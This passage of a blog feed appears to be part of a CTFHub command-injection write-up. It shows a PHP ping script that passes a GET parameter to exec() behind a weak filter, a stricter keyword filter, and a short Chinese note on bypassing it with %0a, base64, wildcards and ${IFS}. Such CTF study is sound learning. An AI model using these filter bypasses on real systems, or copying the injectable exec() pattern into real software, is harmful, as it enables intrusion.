-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$res = FALSE;</span><br><span class="line">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123;</span><br><span class="line">    $ip = $_GET[&#x27;ip&#x27;];</span><br><span class="line">    $m = [];</span><br><span class="line">    if (!preg_match_all(&quot;/(\||\&amp;)/&quot;, $ip, $m)) &#123;</span><br><span class="line">        $cmd = &quot;ping -c 4 &#123;$ip&#125;&quot;;</span><br><span class="line">        exec($cmd, $res);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $res = $m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219104650896.png" alt="image-20220219104650896" /></p>
-<h2 id="综合练习"><a class="markdownIt-Anchor" href="#综合练习"></a> 综合练习</h2>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="variable">$ip</span></span><br></pre></td></tr></table></figure>
-<p>;可以用%0a(url 编码) cat 用 base64 flag 用正则 f*** *lag 等 空格用 ${IFS}</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219105932534.png" alt="image-20220219105932534" /></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219110644693.png" alt="image-20220219110644693" /><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:%5CUsers%5CCNsirius%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220219110736333.png" alt="image-20220219110736333" /></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
